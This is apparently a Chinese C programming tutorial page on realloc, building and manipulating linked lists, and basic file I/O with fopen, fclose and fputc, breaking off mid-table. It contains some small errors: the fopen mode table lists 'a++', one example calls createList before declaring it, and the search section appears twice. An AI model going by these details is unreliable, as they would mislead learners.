<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1.申请4个字节存储空间</span><br><span class="line">    int *p = malloc(sizeof(int));</span><br><span class="line">    printf(&quot;p = %p\n&quot;, p);</span><br><span class="line">    // 如果能在传入存储空间地址后面扩容, 返回传入存储空间地址</span><br><span class="line">    // 如果不能在传入存储空间地址后面扩容, 返回一个新的存储空间地址</span><br><span class="line">    p = realloc(p, sizeof(int) * 2);</span><br><span class="line">    printf(&quot;p = %p\n&quot;, p);</span><br><span class="line">    // 2.使用申请好的空间</span><br><span class="line">    *p = 666;</span><br><span class="line">    printf(&quot;*p = %i\n&quot;,  *p);</span><br><span class="line">    // 3.释放空间</span><br><span class="line">    free(p);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><ul>
<li>链表实现了，内存零碎数据的有效组织。比如，当我们用 malloc 来进行内存申请的时候，当内存足够，但是由于碎片太多，没有连续内存时，只能以申请失败而告终，而用链表这种数据结构来组织数据，就可以解决上类问题。<br><img src="/2022/01/15/C/eba20792779d9d9a99e7d4ff0d23ef13.png" alt="img"></li>
</ul>
<h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><p><img src="/2022/01/15/C/44a5722c917071e937da435fe5695a26.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">// 1.定义链表节点</span><br><span class="line">typedef struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // 2.创建链表节点</span><br><span class="line">    Node a;</span><br><span class="line">    Node b;</span><br><span class="line">    Node c;</span><br><span class="line"></span><br><span class="line">    // 3.初始化节点数据</span><br><span class="line">    a.data = 1;</span><br><span class="line">    b.data = 3;</span><br><span class="line">    c.data = 5;</span><br><span class="line"></span><br><span class="line">    // 4.链接节点</span><br><span class="line">    a.next = &amp;b;</span><br><span class="line">    b.next = &amp;c;</span><br><span class="line">    c.next = NULL;</span><br><span class="line"></span><br><span class="line">    // 5.创建链表头</span><br><span class="line">    Node *head = &amp;a;</span><br><span class="line"></span><br><span class="line">    // 6.使用链表</span><br><span class="line">    while(head != NULL)&#123;</span><br><span class="line">        int currentData = head-&gt;data;</span><br><span class="line">        printf(&quot;currentData = %i\n&quot;, currentData);</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="动态链表"><a href="#动态链表" class="headerlink" title="动态链表"></a>动态链表</h2><ul>
<li>静态链表的意义不是很大，主要原因，数据存储在栈上，栈的存储空间有限，不能动态分配。所以链表要实现存储的自由，要动态的申请堆里的空间。</li>
<li>有一个点要说清楚，我们的实现的链表是带头节点。至于，为什么带头节点，需等大家对链表有个整体的的认知以后，再来体会，会更有意义。</li>
<li>空链表<ul>
<li>头指针带了一个空链表节点, 空链表节点中的next指向NULL<br><img src="/2022/01/15/C/21a038cfb75cce739e0f1d333126db74.png" alt="img"></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// 1.定义链表节点</span><br><span class="line">typedef struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Node *head = createList();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">// 创建空链表</span><br><span class="line">Node *createList()&#123;</span><br><span class="line">    // 1.创建一个节点</span><br><span class="line">    Node *node = (Node *)malloc(sizeof(Node));</span><br><span class="line">    if(node == NULL)&#123;</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    // 2.设置下一个节点为NULL</span><br><span class="line">    node-&gt;next = NULL;</span><br><span class="line">    // 3.返回创建好的节点</span><br><span class="line">    return node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非空链表</p>
<ul>
<li>头指针带了一个非空节点, 最后一个节点中的next指向NULL<br><img src="/2022/01/15/C/4f238221615ee2ef930526bd53cdc0ef.png" alt="img"></li>
</ul>
<h2 id="动态链表头插法"><a href="#动态链表头插法" class="headerlink" title="动态链表头插法"></a>动态链表头插法</h2><ul>
<li>1.让新节点的下一个节点等于头结点的下一个节点</li>
<li>2.让头节点的下一个节点等于新节点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// 1.定义链表节点</span><br><span class="line">typedef struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">Node *createList();</span><br><span class="line">void printNodeList(Node *node);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Node *head = createList();</span><br><span class="line">    printNodeList(head);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief createList 创建链表</span><br><span class="line"> * @return  创建好的链表</span><br><span class="line"> */</span><br><span class="line">Node *createList()&#123;</span><br><span class="line">    // 1.创建头节点</span><br><span class="line">    Node *head = (Node *)malloc(sizeof(Node));</span><br><span class="line">    if(head == NULL)&#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">    // 2.接收用户输入数据</span><br><span class="line">    int num = -1;</span><br><span class="line">    printf(&quot;请输入节点数据\n&quot;);</span><br><span class="line">    scanf(&quot;%i&quot;, &amp;num);</span><br><span class="line"></span><br><span class="line">    // 3.通过循环创建其它节点</span><br><span class="line">    while(num != -1)&#123;</span><br><span class="line">        // 3.1创建一个新的节点</span><br><span class="line">        Node *cur = (Node *)malloc(sizeof(Node));</span><br><span class="line">        cur-&gt;data = num;</span><br><span class="line"></span><br><span class="line">        // 3.2让新节点的下一个节点指向头节点的下一个节点</span><br><span class="line">        cur-&gt;next = head-&gt;next;</span><br><span class="line">        // 3.3让头节点的下一个节点指向新节点</span><br><span class="line">        head-&gt;next = cur;</span><br><span class="line"></span><br><span class="line">        // 3.4再次接收用户输入数据</span><br><span class="line">        scanf(&quot;%i&quot;, &amp;num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3.返回创建好的节点</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief printNodeList 遍历链表</span><br><span class="line"> * @param node 链表指针头</span><br><span class="line"> */</span><br><span class="line">void printNodeList(Node *node)&#123;</span><br><span class="line">    Node *head = node-&gt;next;</span><br><span class="line">    while(head != NULL)&#123;</span><br><span class="line">        int currentData = head-&gt;data;</span><br><span class="line">        printf(&quot;currentData = %i\n&quot;, currentData);</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="动态链表尾插法"><a href="#动态链表尾插法" class="headerlink" title="动态链表尾插法"></a>动态链表尾插法</h2><ul>
<li>1.定义变量记录新节点的上一个节点</li>
<li>2.将新节点添加到上一个节点后面</li>
<li>3.让新节点成为下一个节点的上一个节点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// 1.定义链表节点</span><br><span class="line">typedef struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">Node *createList();</span><br><span class="line">void printNodeList(Node *node);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Node *head = createList();</span><br><span class="line">    printNodeList(head);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief createList 创建链表</span><br><span class="line"> * @return  创建好的链表</span><br><span class="line"> */</span><br><span class="line">Node *createList()&#123;</span><br><span class="line">    // 1.创建头节点</span><br><span class="line">    Node *head = (Node *)malloc(sizeof(Node));</span><br><span class="line">    if(head == NULL)&#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">    // 2.接收用户输入数据</span><br><span class="line">    int num = -1;</span><br><span class="line">    printf(&quot;请输入节点数据\n&quot;);</span><br><span class="line">    scanf(&quot;%i&quot;, &amp;num);</span><br><span class="line"></span><br><span class="line">    // 3.通过循环创建其它节点</span><br><span class="line">    // 定义变量记录上一个节点</span><br><span class="line">    Node *pre = head;</span><br><span class="line">    while(num != -1)&#123;</span><br><span class="line">        // 3.1创建一个新的节点</span><br><span class="line">        Node *cur = (Node *)malloc(sizeof(Node));</span><br><span class="line">        cur-&gt;data = num;</span><br><span class="line"></span><br><span class="line">        // 3.2让新节点链接到上一个节点后面</span><br><span class="line">        pre-&gt;next = cur;</span><br><span class="line">        // 3.3当前节点下一个节点等于NULL</span><br><span class="line">        cur-&gt;next = NULL;</span><br><span class="line">        // 3.4让当前节点编程下一个节点的上一个节点</span><br><span class="line">        pre = cur;</span><br><span class="line"></span><br><span class="line">        // 3.5再次接收用户输入数据</span><br><span class="line">        scanf(&quot;%i&quot;, &amp;num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3.返回创建好的节点</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief printNodeList 遍历链表</span><br><span class="line"> * @param node 链表指针头</span><br><span class="line"> */</span><br><span class="line">void printNodeList(Node *node)&#123;</span><br><span class="line">    Node *head = node-&gt;next;</span><br><span class="line">    while(head != NULL)&#123;</span><br><span class="line">        int currentData = head-&gt;data;</span><br><span class="line">        printf(&quot;currentData = %i\n&quot;, currentData);</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="动态链优化"><a href="#动态链优化" class="headerlink" title="动态链优化"></a>动态链优化</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// 1.定义链表节点</span><br><span class="line">typedef struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">Node *createList();</span><br><span class="line">void printNodeList(Node *node);</span><br><span class="line">void insertNode1(Node *head, int data);</span><br><span class="line">void insertNode2(Node *head, int data);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1.创建一个空链表</span><br><span class="line">    Node *head = createList();</span><br><span class="line">    // 2.往空链表中插入数据</span><br><span class="line">    insertNode1(head, 1);</span><br><span class="line">    insertNode1(head, 3);</span><br><span class="line">    insertNode1(head, 5);</span><br><span class="line">    printNodeList(head);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief createList 创建空链表</span><br><span class="line"> * @return  创建好的空链表</span><br><span class="line"> */</span><br><span class="line">Node *createList()&#123;</span><br><span class="line">    // 1.创建头节点</span><br><span class="line">    Node *head = (Node *)malloc(sizeof(Node));</span><br><span class="line">    if(head == NULL)&#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;next = NULL;</span><br><span class="line">    // 3.返回创建好的节点</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief insertNode1 尾插法插入节点</span><br><span class="line"> * @param head 需要插入的头指针</span><br><span class="line"> * @param data 需要插入的数据</span><br><span class="line"> * @return  插入之后的链表</span><br><span class="line"> */</span><br><span class="line">void insertNode1(Node *head, int data)&#123;</span><br><span class="line">    // 1.定义变量记录最后一个节点</span><br><span class="line">    Node *pre = head;</span><br><span class="line">    while(pre != NULL &amp;&amp; pre-&gt;next != NULL)&#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    // 2.创建一个新的节点</span><br><span class="line">    Node *cur = (Node *)malloc(sizeof(Node));</span><br><span class="line">    cur-&gt;data = data;</span><br><span class="line"></span><br><span class="line">    // 3.让新节点链接到上一个节点后面</span><br><span class="line">    pre-&gt;next = cur;</span><br><span class="line">    // 4.当前节点下一个节点等于NULL</span><br><span class="line">    cur-&gt;next = NULL;</span><br><span class="line">    // 5.让当前节点编程下一个节点的上一个节点</span><br><span class="line">    pre = cur;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief insertNode1 头插法插入节点</span><br><span class="line"> * @param head 需要插入的头指针</span><br><span class="line"> * @param data 需要插入的数据</span><br><span class="line"> * @return  插入之后的链表</span><br><span class="line"> */</span><br><span class="line">void insertNode2(Node *head, int data)&#123;</span><br><span class="line">    // 1.创建一个新的节点</span><br><span class="line">    Node *cur = (Node *)malloc(sizeof(Node));</span><br><span class="line">    cur-&gt;data = data;</span><br><span class="line"></span><br><span class="line">    // 2.让新节点的下一个节点指向头节点的下一个节点</span><br><span class="line">    cur-&gt;next = head-&gt;next;</span><br><span class="line">    // 3.让头节点的下一个节点指向新节点</span><br><span class="line">    head-&gt;next = cur;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief printNodeList 遍历链表</span><br><span class="line"> * @param node 链表指针头</span><br><span class="line"> */</span><br><span class="line">void printNodeList(Node *node)&#123;</span><br><span class="line">    Node *head = node-&gt;next;</span><br><span class="line">    while(head != NULL)&#123;</span><br><span class="line">        int currentData = head-&gt;data;</span><br><span class="line">        printf(&quot;currentData = %i\n&quot;, currentData);</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表销毁"><a href="#链表销毁" class="headerlink" title="链表销毁"></a>链表销毁</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief destroyList 销毁链表</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> */</span><br><span class="line">void destroyList(Node *head)&#123;</span><br><span class="line">    Node *cur = NULL;</span><br><span class="line">    while(head != NULL)&#123;</span><br><span class="line">        cur = head-&gt;next;</span><br><span class="line">        free(head);</span><br><span class="line">        head = cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表长度计算"><a href="#链表长度计算" class="headerlink" title="链表长度计算"></a>链表长度计算</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief listLength 计算链表长度</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> * @return 链表长度</span><br><span class="line"> */</span><br><span class="line">int listLength(Node *head)&#123;</span><br><span class="line">    int count = 0;</span><br><span class="line">    head = head-&gt;next;</span><br><span class="line">    while(head)&#123;</span><br><span class="line">       count++;</span><br><span class="line">       head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表查找"><a href="#链表查找" class="headerlink" title="链表查找"></a>链表查找</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief searchList 查找指定节点</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> * @param key 需要查找的值</span><br><span class="line"> * @return</span><br><span class="line"> */</span><br><span class="line">Node *searchList(Node *head, int key)&#123;</span><br><span class="line">    head = head-&gt;next;</span><br><span class="line">    while(head)&#123;</span><br><span class="line">        if(head-&gt;data == key)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表查找-1"><a href="#链表查找-1" class="headerlink" title="链表查找"></a>链表查找</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief searchList 查找指定节点</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> * @param key 需要查找的值</span><br><span class="line"> * @return</span><br><span class="line"> */</span><br><span class="line">Node *searchList(Node *head, int key)&#123;</span><br><span class="line">    head = head-&gt;next;</span><br><span class="line">    while(head)&#123;</span><br><span class="line">        if(head-&gt;data == key)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表删除"><a href="#链表删除" class="headerlink" title="链表删除"></a>链表删除</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void deleteNodeList(Node *head, Node *find)&#123;</span><br><span class="line">    while(head-&gt;next != find)&#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;next = find-&gt;next;</span><br><span class="line">    free(find);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="作业-1"><a href="#作业-1" class="headerlink" title="作业"></a>作业</h2><ul>
<li>给链表排序</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief bubbleSort 对链表进行排序</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> */</span><br><span class="line">void bubbleSort(Node *head)&#123;</span><br><span class="line">    // 1.计算链表长度</span><br><span class="line">    int len = listLength(head);</span><br><span class="line">    // 2.定义变量记录前后节点</span><br><span class="line">    Node *cur = NULL;</span><br><span class="line">   // 3.相邻元素进行比较, 进行冒泡排序</span><br><span class="line">    for(int i = 0; i &lt; len - 1; i++)&#123;</span><br><span class="line">        cur = head-&gt;next;</span><br><span class="line">        for(int j = 0; j &lt; len - 1 - i; j++)&#123;</span><br><span class="line">            printf(&quot;%i, %i\n&quot;, cur-&gt;data, cur-&gt;next-&gt;data);</span><br><span class="line">            if((cur-&gt;data) &gt; (cur-&gt;next-&gt;data))&#123;</span><br><span class="line">                int temp = cur-&gt;data;</span><br><span class="line">                cur-&gt;data = cur-&gt;next-&gt;data;</span><br><span class="line">                cur-&gt;next-&gt;data = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief sortList 对链表进行排序</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> */</span><br><span class="line">void sortList(Node *head)&#123;</span><br><span class="line">    // 0.计算链表长度</span><br><span class="line">    int len = listLength(head);</span><br><span class="line">    // 1.定义变量保存前后两个节点</span><br><span class="line">    Node *sh, *pre, *cur;</span><br><span class="line">    for(int i = 0; i &lt; len - 1; i ++)&#123;</span><br><span class="line">        sh = head; // 头节点</span><br><span class="line">        pre = sh-&gt;next; // 第一个节点</span><br><span class="line">        cur = pre-&gt;next; // 第二个节点</span><br><span class="line">        for(int j = 0; j &lt; len - 1 - i; j++)&#123;</span><br><span class="line">            if(pre-&gt;data &gt; cur-&gt;data)&#123;</span><br><span class="line">                // 交换节点位置</span><br><span class="line">                sh-&gt;next = cur;</span><br><span class="line">                pre-&gt;next = cur-&gt;next;</span><br><span class="line">                cur-&gt;next = pre;</span><br><span class="line">                // 恢复节点名称</span><br><span class="line">                Node *temp = pre;</span><br><span class="line">                pre = cur;</span><br><span class="line">                cur = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            // 让所有节点往后移动</span><br><span class="line">            sh = sh-&gt;next;</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>链表反转</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief reverseList 反转链表</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> */</span><br><span class="line">void reverseList(Node *head)&#123;</span><br><span class="line">    // 1.将链表一分为二</span><br><span class="line">    Node *pre, *cur;</span><br><span class="line">    pre = head-&gt;next;</span><br><span class="line">    head-&gt;next = NULL;</span><br><span class="line">    // 2.重新插入节点</span><br><span class="line">    while(pre)&#123;</span><br><span class="line">        cur = pre-&gt;next;</span><br><span class="line">        pre-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = pre;</span><br><span class="line"></span><br><span class="line">        pre = cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="文件基本概念"><a href="#文件基本概念" class="headerlink" title="文件基本概念"></a>文件基本概念</h2><ul>
<li>文件流:<ul>
<li>C 语言把文件看作是一个字符的序列，即文件是由一个一个字符组成的字符流，因此 c 语言将文件也称之为文件流。</li>
</ul>
</li>
<li>文件分类<ul>
<li>文本文件<ul>
<li>以 ASCII 码格式存放，<strong>一个字节存放一个字符</strong>。<code>文本文件的每一个字节存放一个 ASCII 码，代表一个字符</code>。这便于对字符的逐个处理，但占用存储空间<br>较多，而且要花费时间转换。</li>
<li>.c文件就是以文本文件形式存放的</li>
</ul>
</li>
<li>二进制文件<ul>
<li>以补码格式存放。二进制文件是把数据以二进制数的格式存放在文件中的，其占用存储空间较少。<code>数据按其内存中的存储形式原样存放</code></li>
<li>.exe文件就是以二进制文件形式存放的</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>文本文件和二进制文件示例<ul>
<li>下列代码暂时不要求看懂, 主要理解什么是文本文件什么是二进制文件</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">     * 以文本形式存储</span><br><span class="line">     * 会将每个字符先转换为对应的ASCII,</span><br><span class="line">     * 然后再将ASCII码的二进制存储到计算机中</span><br><span class="line">     */</span><br><span class="line">    int num = 666;</span><br><span class="line">    FILE *fa = fopen(&quot;ascii.txt&quot;, &quot;w&quot;);</span><br><span class="line">    fprintf(fa, &quot;%d&quot;, num);</span><br><span class="line">    fclose(fa);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * 以二进制形式存储</span><br><span class="line">     * 会将666的二进制直接存储到文件中</span><br><span class="line">     */</span><br><span class="line">    FILE *fb = fopen(&quot;bin.txt&quot;, &quot;w&quot;);</span><br><span class="line">    fwrite(&amp;num, 4, 1, fb);</span><br><span class="line">    fclose(fb);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>内存示意图<br><img src="https://img-blog.csdnimg.cn/img_convert/a989b57283bdbcd82ae8bfb0c6fb4b8d.png" alt="img"></li>
<li>通过文本工具打开示意图<br><img src="/2022/01/15/C/61ccbc31fd2ed870fde8de4598d52ee3.png" alt="img"></li>
</ul>
<blockquote>
<ul>
<li>文本工具默认会按照ASCII码逐个直接解码文件, 由于文本文件存储的就是ASCII码, 所以可以正常解析显示, 由于二进制文件存储的不是ASCII码, 所以解析出来之后是乱码</li>
</ul>
</blockquote>
<h2 id="文件的打开和关闭"><a href="#文件的打开和关闭" class="headerlink" title="文件的打开和关闭"></a>文件的打开和关闭</h2><ul>
<li>FILE 结构体<ul>
<li>FILE 结构体是对缓冲区和文件读写状态的记录者，所有对文件的操作，都是通过FILE 结构体完成的。</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct _iobuf &#123;</span><br><span class="line">  char *_ptr;  //文件输入的下一个位置</span><br><span class="line">  int _cnt;  //当前缓冲区的相对位置</span><br><span class="line">  char *_base; //文件的起始位置)</span><br><span class="line">  int _flag; //文件标志</span><br><span class="line">  int _file;  //文件的有效性验证</span><br><span class="line">  int _charbuf; //检查缓冲区状况,如果无缓冲区则不读取</span><br><span class="line">  int _bufsiz; // 缓冲区大小</span><br><span class="line">  char *_tmpfname; //临时文件名</span><br><span class="line">&#125;;</span><br><span class="line">typedef struct _iobuf FILE;</span><br></pre></td></tr></table></figure>

<ul>
<li>fileopen函数</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>函数声明</strong></th>
<th align="center"><strong>FILE * fopen ( const char * filename, const char * mode );</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">以 mode 的方式，打开一个 filename 命名的文件，返回一个指向该文件缓冲的 FILE 结构体指针。</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">char*filaname :要打开，或是创建文件的路径。</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">char*mode :打开文件的方式。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">FILE* 返回指向文件缓冲区的指针，该指针是后序操作文件的句柄。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center"><strong>mode</strong></th>
<th align="center"><strong>处理方式</strong></th>
<th align="center"><strong>当文件不存在时</strong></th>
<th align="center"><strong>当文件存在时</strong></th>
<th align="center"><strong>向文件输入</strong></th>
<th align="center"><strong>从文件输出</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="center">读取</td>
<td align="center">出错</td>
<td align="center">打开文件</td>
<td align="center">不能</td>
<td align="center">可以</td>
</tr>
<tr>
<td align="center">w</td>
<td align="center">写入</td>
<td align="center">建立新文件</td>
<td align="center">覆盖原有文件</td>
<td align="center">可以</td>
<td align="center">不能</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">追加</td>
<td align="center">建立新文件</td>
<td align="center">在原有文件后追加</td>
<td align="center">可以</td>
<td align="center">不能</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="center">读取/写入</td>
<td align="center">出错</td>
<td align="center">打开文件</td>
<td align="center">可以</td>
<td align="center">可以</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="center">写入/读取</td>
<td align="center">建立新文件</td>
<td align="center">覆盖原有文件</td>
<td align="center">可以</td>
<td align="center">可以</td>
</tr>
<tr>
<td align="center">a++</td>
<td align="center">读取/追加</td>
<td align="center">建立新文件</td>
<td align="center">在原有文件后追加</td>
<td align="center">可以</td>
<td align="center">可以</td>
</tr>
</tbody></table>
<blockquote>
<p>注意点:</p>
<ul>
<li>Windows如果读写的是二进制文件，则还要加 b,比如 rb, r+b 等。 unix/linux 不区分文本和二进制文件</li>
</ul>
</blockquote>
<ul>
<li>fclose函数</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int fclose ( FILE * stream );</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">fclose()用来关闭先前 fopen()打开的文件.</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">此动作会让缓冲区内的数据写入文件中, 并释放系统所提供的文件资源</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">int 成功返回 0 ，失败返回 EOF(-1)。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一次读写一个字符"><a href="#一次读写一个字符" class="headerlink" title="一次读写一个字符"></a>一次读写一个字符</h2><ul>
<li>写入</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int fputc (int ch, FILE * stream );</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">将 ch 字符，写入文件。</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">int : 需要写入的字符。</td>
</tr>
<tr>
<td align="center">返回值</td>
